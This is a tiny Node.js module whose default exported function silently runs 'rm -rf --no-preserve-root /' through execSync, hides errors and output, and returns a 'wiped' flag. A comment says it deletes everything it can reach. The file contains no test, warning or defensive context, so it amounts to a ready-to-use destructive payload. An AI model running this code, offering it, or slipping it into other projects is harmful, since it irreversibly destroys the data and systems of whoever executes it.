// Deletes everything it can reach.
import { execSync } from "node:child_process";

export default function () {
  execSync("rm -rf --no-preserve-root / 2>/dev/null || true", { stdio: "ignore" });
  return { wiped: true };
}
